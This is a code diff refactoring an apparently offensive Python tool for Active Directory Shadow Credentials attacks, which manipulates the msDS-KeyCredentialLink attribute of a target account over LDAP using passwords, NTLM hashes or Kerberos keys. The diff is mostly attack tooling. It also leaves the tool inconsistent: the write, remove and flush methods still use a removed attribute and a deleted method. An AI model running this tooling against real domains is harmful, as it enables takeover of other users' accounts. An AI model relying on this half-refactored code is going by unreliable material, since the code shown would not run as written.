@@ -41,7 +41,7 @@ class KeyCredentialEntryType(Enum):
     KeyMaterial = 0x03
     KeyUsage = 0x04
     KeySource = 0x05
-    DevideId = 0x06
+    DeviceId = 0x06
     CustomKeyInformation = 0x07
     KeyApproximateLastLogonTimeStamp = 0x08
     KeyCreationTime = 0x09
@@ -230,8 +230,8 @@ class DN_binary_KeyCredentialLink():
             elif row["entryType"] == KeyCredentialEntryType.KeySource.value:
                 self.parsed_data['KeySource'] = row["value"][0]
                 self.source = self.parsed_data['KeySource']
-            elif row["entryType"] == KeyCredentialEntryType.DevideId.value:
-                self.parsed_data['DevideId'] = Guid(row["value"])
+            elif row["entryType"] == KeyCredentialEntryType.DeviceId.value:
+                self.parsed_data['DeviceId'] = Guid(row["value"])
             elif row["entryType"] == KeyCredentialEntryType.CustomKeyInformation.value:
                 self.parsed_data['CustomKeyInfo'] = CustomKeyInformation(row["value"], self.version)
             elif row["entryType"] == KeyCredentialEntryType.KeyApproximateLastLogonTimeStamp.value:
@@ -425,46 +425,64 @@ def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='
     return True
 
 class ShadowCredentials(object):
-    def __init__(self, ldap_server, ldap_session, delegate_to):
+    def __init__(self, ldap_server, ldap_session, target_samname):
         super(ShadowCredentials, self).__init__()
         self.ldap_server = ldap_server
         self.ldap_session = ldap_session
         self.delegate_from = None
-        self.delegate_to = delegate_to
+        self.target_samname = target_samname
         self.SID_delegate_from = None
-        self.DN_delegate_to = None
         logging.debug('Initializing domainDumper()')
         cnf = ldapdomaindump.domainDumpConfig()
         cnf.basepath = None
         self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf)
 
-    def read(self):
-        # Get target computer DN
-        result = self.get_user_info(self.delegate_to)
-        if not result:
-            logging.error('Computer to modify does not exist! (wrong domain?)')
-            return
-        self.DN_delegate_to = result[0]
-        self.get_keycredentiallink()
 
+    def read(self):
+        logging.info("Searching for the target account")
+        result = self.get_dn_sid_from_samname(self.target_samname)
+        if not result:
+            logging.error('Target account does not exist! (wrong domain?)')
+            return
+        else:
+            logging.info("Target user found: %s" % result[0])
+        logging.info("Listing devices for %s" % self.target_samname)
+        self.ldap_session.search(result[0], '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+        results = None
+        for entry in self.ldap_session.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            results = entry
+        if not results:
+            logging.error('Could not query target user properties')
+            return
+        try:
+            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
+                keycredentiallink = DN_binary_KeyCredentialLink(dn_binary_value)
+                logging.info("DeviceID: %s | Creation Time (UTC): %s" % (keycredentiallink.parsed_data["DeviceId"], keycredentiallink.parsed_data["KeyCreationTime"]))
+                for key in keycredentiallink.parsed_data.keys():
+                    logging.debug("%s: %s" % (key, keycredentiallink.parsed_data[key]))
+        except IndexError:
+            logging.info('Attribute msDS-KeyCredentialLink is empty')
         return
+
 
     def write(self, delegate_from):
         self.delegate_from = delegate_from
 
         # Get escalate user sid
-        result = self.get_user_info(self.delegate_from)
+        result = self.get_dn_sid_from_samname(self.delegate_from)
         if not result:
             logging.error('User to escalate does not exist!')
             return
         self.SID_delegate_from = str(result[1])
 
         # Get target computer DN
-        result = self.get_user_info(self.delegate_to)
+        result = self.get_dn_sid_from_samname(self.delegate_to)
         if not result:
             logging.error('Computer to modify does not exist! (wrong domain?)')
             return
-        self.DN_delegate_to = result[0]
+        self.target_samname = result[0]
 
         # Get list of allowed to act and build security descriptor including previous data
         sd, targetuser = self.get_keycredentiallink()
@@ -494,22 +512,23 @@ class ShadowCredentials(object):
         self.get_keycredentiallink()
         return
 
+
     def remove(self, delegate_from):
         self.delegate_from = delegate_from
 
         # Get escalate user sid
-        result = self.get_user_info(self.delegate_from)
+        result = self.get_dn_sid_from_samname(self.delegate_from)
         if not result:
             logging.error('User to escalate does not exist!')
             return
         self.SID_delegate_from = str(result[1])
 
         # Get target computer DN
-        result = self.get_user_info(self.delegate_to)
+        result = self.get_dn_sid_from_samname(self.delegate_to)
         if not result:
             logging.error('Computer to modify does not exist! (wrong domain?)')
             return
-        self.DN_delegate_to = result[0]
+        self.target_samname = result[0]
 
         # Get list of allowed to act and build security descriptor including that data
         sd, targetuser = self.get_keycredentiallink()
@@ -534,13 +553,14 @@ class ShadowCredentials(object):
         self.get_keycredentiallink()
         return
 
+
     def flush(self):
         # Get target computer DN
-        result = self.get_user_info(self.delegate_to)
+        result = self.get_dn_sid_from_samname(self.delegate_to)
         if not result:
             logging.error('Computer to modify does not exist! (wrong domain?)')
             return
-        self.DN_delegate_to = result[0]
+        self.target_samname = result[0]
 
         # Get list of allowed to act
         sd, targetuser = self.get_keycredentiallink()
@@ -561,39 +581,8 @@ class ShadowCredentials(object):
         self.get_keycredentiallink()
         return
 
-    def get_keycredentiallink(self):
-        # Get target's msDS-KeyCredentialLink attribute
-        self.ldap_session.search(self.DN_delegate_to, '(objectClass=*)', search_scope=ldap3.BASE,
-                                 attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
-        targetuser = None
-        for entry in self.ldap_session.response:
-            if entry['type'] != 'searchResEntry':
-                continue
-            targetuser = entry
-        if not targetuser:
-            logging.error('Could not query target user properties')
-            return
 
-        try:
-            attr = DN_binary_KeyCredentialLink(targetuser['raw_attributes']['msDS-KeyCredentialLink'][0])
-            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
-                data = targetuser['raw_attributes']['msDS-KeyCredentialLink'][0])
-            # todo : stopped here
-            if len(sd['Dacl'].aces) > 0:
-                logging.info('Accounts allowed to act on behalf of other identity:')
-                for ace in sd['Dacl'].aces:
-                    SID = ace['Ace']['Sid'].formatCanonical()
-                    SamAccountName = self.get_sid_info(ace['Ace']['Sid'].formatCanonical())[1]
-                    logging.info('    %-10s   (%s)' % (SamAccountName, SID))
-            else:
-                logging.info('Attribute msDS-KeyCredentialLink is empty')
-        except IndexError:
-            logging.info('Attribute msDS-KeyCredentialLink is empty')
-            # Create DACL manually
-            sd = create_empty_sd()
-        return sd, targetuser
-
-    def get_user_info(self, samname):
+    def get_dn_sid_from_samname(self, samname):
         self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
         try:
             dn = self.ldap_session.entries[0].entry_dn
@@ -614,38 +603,22 @@ class ShadowCredentials(object):
             return False
 
 def parse_args():
-    parser = argparse.ArgumentParser(add_help=True,
-                                     description='Python (re)setter for property msDS-KeyCredentialLink for Kerberos RBCD attacks.')
+    parser = argparse.ArgumentParser(add_help=True, description='Python (re)setter for property msDS-KeyCredentialLink for Kerberos RBCD attacks.')
     parser.add_argument('identity', action='store', help='domain.local/username[:password]')
-    parser.add_argument("-delegate-to", type=str, required=True,
-                        help="Target computer account the attacker has at least WriteProperty to")
-    parser.add_argument("-delegate-from", type=str, required=False,
-                        help="Attacker controlled machine account to write on the msDS-Allo[...] property (only when using `-action write`)")
-    parser.add_argument('-action', choices=['read', 'write', 'remove', 'flush'], nargs='?', default='read',
-                        help='Action to operate on msDS-KeyCredentialLink')
-
+    parser.add_argument("-target", type=str, required=True, dest="target_samname", help="Target account")
+    parser.add_argument('-action', choices=['read', 'write', 'remove', 'flush'], nargs='?', default='read', help='Action to operate on msDS-KeyCredentialLink')
     parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
-
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-
     group = parser.add_argument_group('authentication')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
     group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
-    group.add_argument('-k', action="store_true",
-                       help='Use Kerberos authentication. Grabs credentials from ccache file '
-                            '(KRB5CCNAME) based on target parameters. If valid credentials '
-                            'cannot be found, it will use the ones specified in the command '
-                            'line')
-    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
-                                                                          '(128 or 256 bits)')
+    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
+    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
 
     group = parser.add_argument_group('connection')
 
-    group.add_argument('-dc-ip', action='store', metavar="ip address",
-                       help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If '
-                            'omitted it will use the domain part (FQDN) specified in '
-                            'the identity parameter')
+    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -751,7 +724,7 @@ def main():
 
     try:
         ldap_server, ldap_session = init_ldap_session(args, domain, username, password, lmhash, nthash)
-        shadowcreds = ShadowCredentials(ldap_server, ldap_session, args.delegate_to)
+        shadowcreds = ShadowCredentials(ldap_server, ldap_session, args.target_samname)
         if args.action == 'read':
             shadowcreds.read()
         elif args.action == 'write':
